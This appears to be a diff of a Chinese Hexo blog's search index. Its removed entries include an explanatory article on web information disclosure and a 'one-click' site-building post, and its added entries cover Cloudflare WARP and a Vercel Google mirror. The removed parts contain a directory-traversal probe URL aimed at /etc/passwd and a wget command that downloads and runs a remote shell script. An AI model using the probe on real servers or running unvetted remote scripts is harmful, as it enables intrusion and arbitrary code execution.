-<p>22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)</p>
-<p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
-<p>在上面例子中，我们使用Nmap扫描器对目标进行端口扫描。结果表明目标开启了22端口，并且OpenSSH版本号是5.9p1。也许这个版本就存在可以被攻击者利用的漏洞。</p>
-<p><strong>源码泄漏</strong></p>
-<p>当Web应用程序的后端环境代码暴露给不涉及应用程序开发的用户时，会发生源代码泄露问题。源代码泄露使攻击者能够通过读取代码和检查逻辑缺陷，以及查看硬编码的用户名&#x2F;密码对或者API密钥来发现这个应用程序的不足以及漏洞。</p>
-<p>漏洞的严重性取决于泄漏源码的多少，以及代码在应用程序中的重要性。总而言之，因为攻击者可以查看源代码，所以很大程度上将渗透测试由黑盒转向白盒。事实上，有很多错误能够导致源码泄漏的漏洞发生，下面这几种错误就包含在其中：</p>
-<p><strong>代码库未受保护</strong></p>
-<p>为了更加方便的管理站点，大多数站点都会把他们源码上传到云端。这些项目有时会管理不当，攻击者能够直接访问网站源码和网站信息。并且，有些公司将他们的开源软件项目放到了github上面，这样公共用户可以对这个项目作出改进。这种情况下，源码已经是公开的，但是这种情况下泄漏公司重要信息已经是很常见了。</p>
-<p>实例：</p>
-<p>有些源码库只允许使用第三方帐号进行登录并且符合身份认证的用户查看源码代码。这些源码库有时候配置错误，没有严格控制查看内容的权限，导致任何人都可以查看源码内容。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-28.png" alt="图片"></p>
-<p><strong>源代码中存在敏感信息</strong></p>
-<p>另一个例子是当公共代码具有硬编码的敏感信息时，例如用户凭证或API密钥。攻击者可以轻松地使用这些信息来破坏这些服务，或者可以使用合法账户进行登录。在信息披露期间通常泄漏的另一条信息是内部IP地址，允许攻击者识别和了解内部网络拓扑，然后可以将这样的信息用于攻击内部服务中，例如服务器端请求伪造（SSRF）攻击来攻击多个系统。</p>
-<p><strong>MIME类型不正确</strong></p>
-<p>浏览器通过HTTP包头中的Content-Type内容来确定如何解析HTTP服务器响应返回的内容。举个例子，我们想让浏览器将html文件解析，而不是只是纯文本文件。再比如我们想让浏览器下载一个zip，而不是解析这个zip文件。</p>
-<p>如果web服务器的配置错误，那么就会出现这样的错误：当我们访问html时候，Conten-Type会是:text&#x2F;plain,而不是text&#x2F;html，并且html文件会以纯文档的形式展现给浏览器。因此&lt;&#x2F;&gt;还有一些其他字符都会在页面上显示出来。下面图片是展示当页面访问时服务器设置的Content-Type响应头。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-29.png" alt="图片"></p>
-<p>当Web应用程序无法为其中包含源代码的网页发送适当的Content-Type头部时，可能会发生信息泄露问题，并且最终以纯文本形式呈现信息，并披露有关Web应用程序的有价值信息。</p>
-<p><strong>实例</strong>：</p>
-<p>我们假设一个Web服务器用于运行一个PHP</p>
-<p>Web应用程序，但现在运行一个ASP.NET。以前由旧的Web应用程序使用并具有敏感信息（如MySQL数据库凭据）的PHP脚本正在被用户访问。如果PHP没有在Web服务器上运行和配置，则Content-Type将从HTTP响应中省略，并且PHP脚本将被解释为纯文本或HTML标记，具体取决于Web浏览器，然后就会泄露里面包含的所有信息。</p>
-<p>下面屏幕截图就展示了即使服务器返回头没有设置Content-Type，火狐浏览器还是将php脚本解析成了HTML。我们需要在查看源代码中看到脚本信息。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-30.png" alt="图片"></p>
-<p>下面截图展示了chrome浏览器直接返回了纯文本的文件，所以我们可以直接看到源码。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-31.png" alt="图片"></p>
-<p><strong>处理敏感信息不当</strong></p>
-<p>另一种常见的信息泄漏是由硬编码的账户名和密码以及内部ip在代码的注释中泄漏。在大多数情况下，这些敏感信息在访问web页面时会展现出来。这些敏感信息的泄漏也可能会导致web应用程序遭受攻击。攻击者只需要右键页面查看网页源代码，就可以找到这些注释。如果在发现web应用程序存在这种问题，Netsparker将会提醒您。</p>
-<p><strong>缺少认证机制或者认证机制配置不当</strong></p>
-<p>在Web应用程序权限设置不正确，不完整或甚至缺少授权检查可能会允许攻击者访问敏感信息或未授权访问登录用户的信息。这些问题很常见，它们也列在OWASP十大最常见和利用漏洞的列表中。</p>
-<p>示例：<a href="https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/">https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/</a></p>
-<p>一个真实的权限控制不当，导致被拿shell的案例。</p>
-<p><strong>文件名或者文件路径泄漏</strong></p>
-<p>在某些情况下，Web应用程序可以公开文件名或文件路径，从而显示关于底层系统结构的信息。这可能是由于用户输入的不正确处理，后端的异常或Web服务器的不当配置。有时可以在Web应用程序，错误页面，调试信息等的响应中找到或标识这些信息。</p>
-<p>示例：</p>
-<p>攻击者可以通过发送访问请求来检查Web应用程序是否公开任何文件名或路径。例如，当发送以下请求时，Web应用程序返回403（禁止）响应：</p>
-<p><a href="https://www.example.com/etc/passwd">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</a></p>
-<p>但是当攻击者发送下面请求时，web应用程序返回404（没有文件）的响应：</p>
-<p><a href="https://www.example.com/etc/doesntexist">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/doesntexist</a></p>
-<p>由于第一次请求，攻击者得到了403 Forbidden错误，而对于第二个请求，他得到了404 Not Found，他知道在第一种情况下，该文件存在。因此，攻击者可以利用Web应用程序的行为，了解服务器的结构以及验证系统上是否存在某个文件夹或文件。</p>
-<p><strong>目录遍历</strong></p>
-<p>文件名和路径公开相关的是Web服务器中的目录显示功能。此功能在Web服务器上默认提供。当没有默认网页时，在网站上显示Web服务器显示用户列表中的文件和目录。</p>
-<p>因此，在apahce服务器上面默认文件名为Index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。如下图：</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-32.png" alt="图片"></p>
-<p>使用这样一个模块会使服务器产生很大的安全隐患。</p>
-<p>实例：</p>
-<p>现在很多人都知道这样的功能应该被禁用，所以看到它并不常见。虽然我们假设扫描Web服务器的端口后，攻击者发现在8081端口运行的Web服务器的默认启动此功能。</p>
-<p>这样的“默认值”通常被Web服务器管理员忽略，这也意味着它们不太安全。它会允许攻击者浏览目录并访问Web应用程序的源代码，备份和可能的数据库文件。</p>
-<p><strong>防止信息泄漏应该注意的事项</strong></p>
-<p>信息泄漏问题似乎是一件小事情，但对攻击者来说是非常有价值的。它们允许攻击者通过执行基本测试，有时只需在公共页面中查找信息，获得有关攻击目标的非常有用的信息。</p>
-<p>事实上，Netsparker在扫描目标网站时会报告知识库节点中可能的信息披露和其他类似的安全问题。你应该解决这些问题，特别是当你认为它们很容易修复时。以下是遵循的一些指导方针，以便您可以确保您的Web应用程序受到良好保护：</p>
-<ol>
-<li>确保您的Web服务器不发送显示有关后端技术类型或版本信息的响应头。</li>
-<li>确保服务器打开的端口上运行的所有服务都不会显示有关其构建和版本的信息。</li>
-<li>确保所有目录的访问权限正确，保证不会让攻击者访问到你的所有文件。</li>
-<li>不要在代码中将账户密码硬编码进去。也不要在注释中写入相关信息。</li>
-<li>在web服务器中为所有类型的应用程序配置MIME信息</li>
-<li>不需要上传到网站上的敏感信息永远都不要上传</li>
-<li>始终检查每个创建&#x2F;编辑&#x2F;查看&#x2F;删除资源的请求是否具有适当的访问控制，防止越权访问，并确保所有机密信息保密。</li>
-<li>确保您的Web应用程序正确处理用户输入，并且始终为所有不存在&#x2F;不允许的资源返回通用响应，以便混淆攻击者。</li>
-<li>后端代码应该考虑到所有情况，并且当异常发生时，能够保证信息不被泄漏。</li>
-<li>配置Web服务器以禁止目录遍历，并确保Web应用程序始终显示默认网页。</li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 建站 </tag>
+            
+            <tag> warp </tag>
+            
+            <tag> Docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>使用cloudflarre warp保护你的ip</title>
+      <link href="/2023/08/09/%E4%BD%BF%E7%94%A8cloudflarre-warp%E4%BF%9D%E6%8A%A4%E4%BD%A0%E7%9A%84ip/"/>
+      <url>/2023/08/09/%E4%BD%BF%E7%94%A8cloudflarre-warp%E4%BF%9D%E6%8A%A4%E4%BD%A0%E7%9A%84ip/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>cloudfare出品的WARP，它支持多种平台，windows 、Linux、MacOS 和安卓</p><span id="more"></span><p>最近比较火的一个魔法，那就是由cloudfare出品的WARP，它支持多种平台，windows 、Linux、MacOS 和安卓，苹果端都可以轻松使用。不仅如此，只要我们注册一个团队账户，还可以无限流量使用，而且速度丝毫不差，比起很多免费的魔法来说，真的是非常的流畅，在YouTube上看4k视频也是轻轻松松。</p><p>相信不少小伙伴已经体验过了，但是还有一部分小伙伴非常疑惑，为什么自己安装测试之后，发现和博主说的相差很大，不仅网速非常卡，而且有一部分甚至无法连接，一直卡在链接界面。那是因为啊，通过这个WARP客户端自动分配的对端IP地址，仅仅是根据你所在地的位置，分配一个就近的ip ，而不是分配一个网速最快的，延迟最小的IP地址。也就是说，有一部分同学需要通过优选IP，才能实现更低延迟，更快的速度！<br>那么我们现在就来讲一下，如何通过优选IP来让WARP实现真正的高速低延迟的访问，解决大家无法连接，或者连接上也非常卡的问题。</p><p>为了照顾很多新手同学，我就从注册和下载客户端开始讲起，已经知道如何操作使用的同学，可以直接跳到视频后半部分，观看如何进行IP优选。</p><h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><p>1、访问网址：<a href="https://1.1.1.1/">https://1.1.1.1/</a> 这个网址打不开的同学，<strong>直接从第4步开始操作。</strong> <em><strong><del>那就没办法了吗？</del> 可使用博主提前下载好的安装包</strong></em>  <a href="https://drive.alone-hk.cn/zyxz/10.%E5%B0%8F%E5%B7%A5%E5%85%B7/warp/">点我下载</a>  <strong>若打开提示NOxxx在浏览器地址栏刷新一下就好</strong></p><p>若下载太慢请使用 <a href="https://www.bilibili.com/video/BV11W4y1g7QV/?share_source=copy_web&vd_source=3f75256c56cdcaf5410b3d911906f5bb"><strong>IDM</strong></a>  下载</p><p>2、根据自己的情况，下载对应的客户端，这里需要注意的是，使用iPhone的同学，请用<strong>美区Apple ID</strong>进行下载。</p><p>3、我这里下载windows客户端，下载完成后，点击安装。</p><p><a href="https://imgse.com/i/pPezR2j"><img src="https://s1.ax1x.com/2023/08/10/pPezR2j.png" alt="pPezR2j.png"></a></p><p>4、打开cloudflare官方网站：<a href="https://www.cloudflare.com/zh-cn/">https://www.cloudflare.com/zh-cn/</a> 并进行注册</p><p><a href="https://imgse.com/i/pPez2GQ"><img src="https://s1.ax1x.com/2023/08/10/pPez2GQ.png" alt="pPez2GQ.png"></a></p><p>5、来到左侧列表里的Zero Trust<br>，根据提示一步步注册账号，选择0元的！到结账那一步，直接关闭网页，就等于跳过绑定支付方式。</p><p><a href="https://imgse.com/i/pPezgPg"><img src="https://s1.ax1x.com/2023/08/10/pPezgPg.png" alt="pPezgPg.png"></a></p><p>6、再次回到cloudflare官方网站，点击左侧列表的Zero Trust之后，点击左侧列表my team 第一个，添加邮箱后缀，<strong>如果是谷歌邮箱，那么后缀就是@gmail，如果是qq邮箱，那后缀就是@qq.com</strong></p><p><a href="https://imgse.com/i/pPezWxs"><img src="https://s1.ax1x.com/2023/08/10/pPezWxs.png" alt="pPezWxs.png"></a></p><p>7、添加完成后，也可以直接在此处下载客户端。回到WARP，点击偏好设置，找到账号，登录刚刚申请好的Zero Trust账户即可！</p><p><a href="https://imgse.com/i/pPez4rq"><img src="https://s1.ax1x.com/2023/08/10/pPez4rq.png" alt="pPez4rq.png"></a></p><p><a href="https://imgse.com/i/pPezbiF"><img src="https://s1.ax1x.com/2023/08/10/pPezbiF.png" alt="pPezbiF.png"></a></p><p>6、另一种无限流量获取方式：TG搜索机器人@generatewarpplusbot进行流量添加，需要加入2个群组，回答一个数学题，回答完成后，会送一个密钥，密钥复制，来到WARP客户端，点击偏好设置，点击更改密钥，粘贴刚刚获取的密钥。</p><p><a href="https://imgse.com/i/pPezhMn"><img src="https://s1.ax1x.com/2023/08/10/pPezhMn.png" alt="pPezhMn.png"></a></p><p><a href="https://imgse.com/i/pPezTaT"><img src="https://s1.ax1x.com/2023/08/10/pPezTaT.png" alt="pPezTaT.png"></a></p><p>若无法使用的话这里博主会在公众号不定期更新密钥 <a href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzkzNzUyMjQ3Ng==&scene=124#wechat_redirect">点我回复关键字 “warp key”获取</a></p><p>7、想要优选IP的同学，下载这个优选IP程序：<a href="https://short.alone-hk.cn/9qK6B">点击下载</a></p><p><a href="https://imgse.com/i/pPez5q0"><img src="https://s1.ax1x.com/2023/08/10/pPez5q0.png" alt="pPez5q0.png"></a></p><p>8、使用优选IP软件进行优选，2种方式，首先关闭WARP的连接。点击自动方式，自动的如果出错，就换手动的。手动方式1，打开操作。完成后打开根目录的输出文件，选择第一个延迟较低的ip地址和端口。再次打开手动方式2，右键粘贴刚刚的ip地址和端口。回车确认。WARP会自动连接。这就等于优选成功了！</p><p><a href="https://imgse.com/i/pPez7IU"><img src="https://s1.ax1x.com/2023/08/10/pPez7IU.png" alt="pPez7IU.png"></a></p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>node-npm,yarn和pnpm区别</title>
-    <url>/2023/08/13/node-npm-yarn%E5%92%8Cpnpm%E5%8C%BA%E5%88%AB/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>简单总结下npm,yarn和pnpm三种包管理器的区别</p>
-<span id="more"></span>
-
-<h2 id="一-npm"><a href="#一-npm" class="headerlink" title="一 npm"></a>一 npm</h2><h4 id="1-简述"><a href="#1-简述" class="headerlink" title="1 简述"></a>1 简述</h4><p>npm 是 Node Package Manager 的缩写，是一个 NodeJS 包管理和分发工具，我们可以使用它发布、安装和卸载 NodeJS 包。npm 是 JavaScript 运行时环境 Node.js 的默认包管理器。</p>
-<h4 id="2-官网"><a href="#2-官网" class="headerlink" title="2 官网"></a>2 官网</h4><p><a href="https://www.npmjs.com/">https://www.npmjs.com/</a></p>
-<h4 id="3-说明"><a href="#3-说明" class="headerlink" title="3 说明"></a>3 说明</h4><p><strong>npm2</strong>存在很严重的依赖嵌套关系</p>
-<pre><code>node_modules
-- package-A
--- node_modules
---- package-B
------ node_modules
------- package-C
--------- some-really-really-really-long-file-name-in-package-c.js
-</code></pre>
-<p><strong>npm3</strong>扁平依赖</p>
-<pre><code>node_modules
-- package-A
--- node_modules
---- package-B
------ node_modules
------- package-C
--------- some-really-really-really-long-file-name-in-package-c.js
-</code></pre>
-<p><code>npm</code>必须首先遍历所有的项目依赖关系，然后再决定如何生成扁平的<code>node_modules</code>目录结构。npm必须为所有使用到的模块构建一个完整的依赖关系树，这是一个耗时的操作,是<a href="https://link.juejin.cn/?target=https://github.com/npm/npm/issues/8826">npm安装速度慢的一个很重要的原因</a>。本地缓存的内容可以通过<code>npm cache ls</code>命令进行查看。本地缓存的设计有助于减少安装时间。</p>
-<h2 id="二-yarn"><a href="#二-yarn" class="headerlink" title="二 yarn"></a>二 yarn</h2><h4 id="1-简述-1"><a href="#1-简述-1" class="headerlink" title="1 简述"></a>1 简述</h4><p>yarn 是 facebook 等公司在 npm v3 时推出的一个新的开源的 Node Package Manager，它的出现是为了弥补 npm 当时安装速度慢、依赖包版本不一致等问题。</p>
-<h4 id="2-官网-1"><a href="#2-官网-1" class="headerlink" title="2 官网"></a>2 官网</h4><p><a href="https://yarnpkg.com/">https://yarnpkg.com/</a></p>
-<h4 id="3-说明-1"><a href="#3-说明-1" class="headerlink" title="3 说明"></a>3 说明</h4><p>它的出现是为了弥补 npm 当时安装速度慢、依赖包版本不一致等问题。每个yarn安装都会生成一个类似于<code>npm-shrinkwrap.json</code>的<code>yarn.lock</code>文件，而且它是默认创建的。除了常规信息之外，<code>yarn.lock</code>文件还包含要安装的内容的校验和，以确保使用的库的版本相同。<code>yarn</code>无需互联网连接就能安装本地缓存的依赖项，它提供了离线模式。</p>
-<p>yarn 有以下优点：</p>
-<ol>
-<li><p>安装速度快</p>
-<ul>
-<li>并行安装：npm 是按照队列依次安装每个 package，当前一个 package 安装完成之后，才能继续后面的安装。而 Yarn 是同步执行所有任务。</li>
-<li>缓存：如果一个 package 之前已经安装过，yarn 会直接从缓存中获取，而不是重新下载。</li>
-</ul>
-</li>
-<li><p>版本统一</p>
-<p>yarn 创新性的新增了 yarn.lock 文件，它是 yarn 在安装依赖包时，自动生成的一个文件，作用是记录 yarn 安装的每个 package 的版本，保证之后 install 时的版本一致。不过随着后来 npm 也新增了作用相同的 package-lock.json，这个优势已经不太明显。</p>
-</li>
-</ol>
-<h2 id="三-pnpm"><a href="#三-pnpm" class="headerlink" title="三 pnpm"></a>三 pnpm</h2><h4 id="1-简述-2"><a href="#1-简述-2" class="headerlink" title="1 简述"></a>1 简述</h4><p>2017 年 pnpm 推出。全称 Performance NPM，即高性能的 npm。</p>
-<h4 id="2-官网-2"><a href="#2-官网-2" class="headerlink" title="2 官网"></a>2 官网</h4><p><a href="https://pnpm.io/">https://pnpm.io/</a></p>
-<h4 id="3-说明-2"><a href="#3-说明-2" class="headerlink" title="3 说明"></a>3 说明</h4><p>pnpm采用了一种巧妙的方法，利用硬链接和符号链接来避免复制所有本地缓存源文件,同一个包 pnpm 只会安装一次，磁盘中只有一个地方写入，后面再次使用都会直接使 hardlink。即使一个包的不同版本，pnpm 也会极大程度地复用之前版本的代码。举个例子，比如 lodash 有 100 个文件，更新版本之后多了一个文件，那么磁盘当中并不会重新写入 101 个文件，而是保留原来的 100 个文件的 hardlink，仅仅写入那一个新增的文件。</p>
-<h2 id="四-命令对比"><a href="#四-命令对比" class="headerlink" title="四 命令对比"></a>四 命令对比</h2><h3 id="npm-yarn-和-pnpm-之间命令的区别"><a href="#npm-yarn-和-pnpm-之间命令的区别" class="headerlink" title="npm yarn 和 pnpm 之间命令的区别"></a>npm yarn 和 pnpm 之间命令的区别</h3><table>
-<thead>
-<tr>
-<th>-</th>
-<th>npm</th>
-<th>yarn</th>
-<th>pnpm</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Install all</td>
-<td>npm install</td>
-<td>yarn</td>
-<td>pnpm install</td>
-</tr>
-<tr>
-<td>Install</td>
-<td>npm install [package]</td>
-<td>yarn add [package]</td>
-<td>pnpm add [package]</td>
-</tr>
-<tr>
-<td></td>
-<td>npm install [package] -D</td>
-<td>yarn add [package] -D</td>
-<td>pnpm add -D [package]</td>
-</tr>
-<tr>
-<td></td>
-<td>npm install [package] -g</td>
-<td>yarn global add [package]</td>
-<td>pnpm add -g [package]</td>
-</tr>
-<tr>
-<td>Uninstall</td>
-<td>npm uninstall [package]</td>
-<td>yarn remove [package]</td>
-<td>pnpm remove [package]</td>
-</tr>
-<tr>
-<td>Update</td>
-<td>npm update [package]</td>
-<td>yarn upgrade [package]</td>
-<td>pnpm update [package]</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>参考文档</p>
-<p><a href="http://events.jianshu.io/p/e02ffa9effe6">npm、 yarn 和 pnpm 的区别 - 简书 (jianshu.io)</a></p>
-<p><a href="https://juejin.cn/post/6844903616109641736">一文看懂npm、yarn、pnpm之间的区别 - 掘金 (juejin.cn)</a></p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> cloudflare </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通过vercel搭建谷歌镜像站</title>
+      <link href="/2023/07/29/%E9%80%9A%E8%BF%87vercel%E6%90%AD%E5%BB%BA%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F%E7%AB%99/"/>
+      <url>/2023/07/29/%E9%80%9A%E8%BF%87vercel%E6%90%AD%E5%BB%BA%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F%E7%AB%99/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>通过vercel搭建谷歌镜像站</p><span id="more"></span><p>通过vercel搭建谷歌镜像站，需要准备两样东西。</p><p>1.Nodejs环境</p><p>2.vercel账号</p><p>建议大家使用Windows安装nodejs</p><h3 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h3><h4 id="一-下载"><a href="#一-下载" class="headerlink" title="一.下载"></a>一.下载</h4><p>建议使用nvm安装便于管理</p><p>打开项目地址<a href="https://github.com/coreybutler/nvm-windows/releases">https://github.com/coreybutler/nvm-windows/releases</a></p><p>可以看到有许多文件</p><p>这里稍做下解释：</p><ul><li>nvm-noinstall.zip： 这个是绿色版本，不需要安装，但是使用之前需要配置环境变量；</li><li>nvm-setup.zip：<strong>推荐</strong>下载这个包，无需配置就可以使用；</li><li>Source code(zip)：zip 压缩的源码；</li><li>Sourc code(tar.gz)：tar.gz 的源码，一般用于 *nix 系统。</li></ul><h4 id="二-安装"><a href="#二-安装" class="headerlink" title="二.安装"></a>二.安装</h4><p>例如我选择nvm-setup.zip解压后</p><p><strong>1、双击安装文件 nvm-setup.exe</strong></p><p><strong>2、选择nvm安装路径</strong></p><p><strong>3、选择nodejs路径</strong></p><p><strong>4、确认安装即可</strong></p><p><strong>5、安装完确认</strong></p><p>打开CMD，输入命令 nvm ，安装成功则会显示版本号例如Running version 1.1.7</p><h4 id="三-使用"><a href="#三-使用" class="headerlink" title="三.使用"></a>三.使用</h4><p><strong>nvm管理node版本</strong></p><p>1、查看所有可安装的版本</p><pre><code class="shell">nvm list available</code></pre><p>2、查看本地已经安装的所有版本</p><pre><code class="shell">nvm list</code></pre><p>3、安装，命令中的版本号</p><pre><code class="shell">nvm install 14.18.1</code></pre><p>4、使用指定node版本</p><pre><code class="shell">nvm use 14.18.1</code></pre><p>5、卸载</p><pre><code class="shell">nvm uninstall 14.18.1</code></pre><h4 id="四-其他nvm相关命令"><a href="#四-其他nvm相关命令" class="headerlink" title="四.其他nvm相关命令"></a>四.<strong>其他nvm相关命令</strong></h4><pre><code class="shell">nvm arch ：显示node是运行在32位还是64位。nvm install &lt;version&gt; [arch] ：安装node， version是特定版本也可以是最新稳定版本latest。可选参数arch指定安装32位还是64位版本，默认是系统位数。可以添加--insecure绕过远程服务器的SSL。nvm list [available] ：显示已安装的列表。可选参数available，显示可安装的所有版本。list可简化为ls。nvm on ：开启node.js版本管理。nvm off ：关闭node.js版本管理。nvm proxy [url] ：设置下载代理。不加可选参数url，显示当前代理。将url设置为none则移除代理。nvm node_mirror [url] ：设置node镜像。默认是https://nodejs.org/dist/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。nvm npm_mirror [url] ：设置npm镜像。https://github.com/npm/cli/archive/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。nvm uninstall &lt;version&gt; ：卸载指定版本node。nvm use [version] [arch] ：使用制定版本node。可指定32/64位。nvm root [path] ：设置存储不同版本node的目录。如果未设置，默认使用当前目录。nvm version ：显示nvm版本。version可简化为v。</code></pre><h3 id="vercel配置"><a href="#vercel配置" class="headerlink" title="vercel配置"></a>vercel配置</h3><p>安装完成之后，打开cmd输入这个命令</p><pre><code>npm i -g vercelnpm install -g cnpm --registry=https://registry.npm.taobao.org &amp;&amp; cnpm i -g vercel</code></pre><p>运行完毕之后Vercel CLI就安装在你的电脑上了。</p><p>之后我们就要登录Vercel CLI，使用cmd，执行</p><pre><code>vercel login</code></pre><p>选择登录方式，推荐使用github登录</p><p>出现这个就代表登录成功啦</p><p>You have been successfully authenticated as:</p><p>CLI Login Success</p><p><a href="mailto:&#x78;&#120;&#120;&#x78;&#120;&#64;&#120;&#120;&#x78;&#x2e;&#120;&#x78;&#120;">&#x78;&#120;&#120;&#x78;&#120;&#64;&#120;&#120;&#x78;&#x2e;&#120;&#x78;&#120;</a>(您的邮箱）</p><p>You can now close this tab and return to the CLI.</p><p>登录成功之后，在电脑的c盘建一个文件夹（名字自定义，其实在哪都可以建，只要你能找到这个文件夹就可以），里面新建一个TXT文件，名称随意，打开输入以下信息</p><pre><code>&#123;&quot;version&quot;: 2,&quot;routes&quot;: [&#123;&quot;src&quot;: &quot;/(.*)&quot;,&quot;dest&quot;: &quot;website/$1&quot;&#125; ]&#125;</code></pre><p>将其中的website，换成你要代理的网站，需要带https:&#x2F;&#x2F;或http:&#x2F;&#x2F;，就比如你要代理谷歌，那么就要输入<a href="https://www.google.com/">https://www.google.com</a></p><p>替换完成之后保存，改文件扩展名为json，也就是把txt改为JSON，改完之后切换到cmd，这一步就完成了。</p><p>打开cmd，输入</p><pre><code>cd 你的文件夹路径</code></pre><p>之后回车</p><p>成功打开文件夹之后输入</p><pre><code>vercel -A 你的文件名（仅限英文）.json --prod</code></pre><p>回车之后稍等</p><p>Set up and deploy “你的路径”? [Y&#x2F;n] y</p><p>Which scope do you want to deploy to?（直接回车）</p><p>Link to existing project? [y&#x2F;N] n</p><p>What’s your project’s name? （随便输入名字，仅限英文）</p><p>which directory is your .&#x2F;（直接回车）</p><p>Want to override the settings? [y&#x2F;N] n</p><p>等它跑完就行了。</p><p>之后最后面的地址就是你的镜像站啦~</p><p>进入velcel官方网站之后，还可以绑定自己的域名！</p><p>在域名注册商添加解析添加CNAME解析  </p><p>例如我使用cloudflare</p><table><thead><tr><th align="left">类型</th><th align="left">名称</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>CNAME</strong></td><td align="left">google</td><td align="left">cname-china.vercel-dns.com</td></tr></tbody></table><p>然后打开仓库选择settings</p><p>在Domains中添加域名即可</p>]]></content>
+      
+      
       <categories>
-        <category>Web</category>
+          
+          <category> Web </category>
+          
       </categories>
-      <tags>
-        <tag>npm</tag>
-        <tag>yarn</tag>
-        <tag>pnpm</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一键脚本建站</title>
-    <url>/2023/08/13/%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一键脚本上线！内置LDNMP建站脚本！</p>
-<span id="more"></span>
-
-<p>安装下载工具</p>
-<p>如果没有安装，则可以使用<code>yum</code>命令进行安装，命令格式如下：</p>
-<pre><code class="text">yum -y install wget
-</code></pre>
-<p>这里的参数<code>-y</code>表对对于安装软件包之前的任何提示进行确认，相当于如果询问你“是否****[y&#x2F;n]”，你默认选择<code>y</code>。</p>
-<p>如果您使用的是其他的发行版例如<a href="https://link.zhihu.com/?target=https://linux265.com/distro/45.html">Ubuntu</a>，<a href="https://link.zhihu.com/?target=https://linux265.com/distro/10.html">Debian</a>，一般系统默认安装有wget命令，如果没有安装可以通过以下命令安装。</p>
-<pre><code class="text">sudo apt install wget
-</code></pre>
-<p><strong>一键脚本</strong></p>
-<pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh
-</code></pre>
-<p>若以上地址你无法使用请尝试</p>
-<pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh
-</code></pre>
-<p>脚本展示图</p>
-<p><a href="https://s1.ax1x.com/2023/08/13/pPufa9K.png"><img src="https://s1.ax1x.com/2023/08/13/pPufa9K.png" alt="img"></a></p>
-<p>目前只支持Ubuntu和Debian系统，暂不支持其它系统！</p>
-<p>此脚本目前比较基础，会不断进化，整合大家常用的脚本。方便使用。</p>
-<p>LDNMP属于原创内容，建站更方便。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Google镜像 </tag>
+            
+            <tag> vercel </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>记一次hugo推送配置</title>
+      <link href="/2023/07/27/%E8%AE%B0%E4%B8%80%E6%AC%A1hugo%E6%8E%A8%E9%80%81%E9%85%8D%E7%BD%AE/"/>
+      <url>/2023/07/27/%E8%AE%B0%E4%B8%80%E6%AC%A1hugo%E6%8E%A8%E9%80%81%E9%85%8D%E7%BD%AE/</url>
+      
